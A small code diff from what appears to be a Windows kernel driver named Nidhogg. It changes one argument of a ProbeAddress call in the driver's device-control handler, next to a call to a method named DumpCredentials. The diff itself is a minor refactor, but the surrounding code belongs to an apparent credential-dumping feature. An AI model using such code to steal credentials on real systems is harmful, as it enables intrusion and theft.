@@ -1160,7 +1160,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggMemoryHandler->DumpCredentials(&sizeToAlloc);
 
 			if (NT_SUCCESS(status)) {
-				status = ProbeAddress(data, sizeof(SIZE_T), sizeof(SIZE_T), STATUS_INVALID_ADDRESS);
+				status = ProbeAddress(data, sizeof(SIZE_T), sizeof(SIZE_T));
 
 				if (NT_SUCCESS(status))
 					*data = sizeToAlloc;
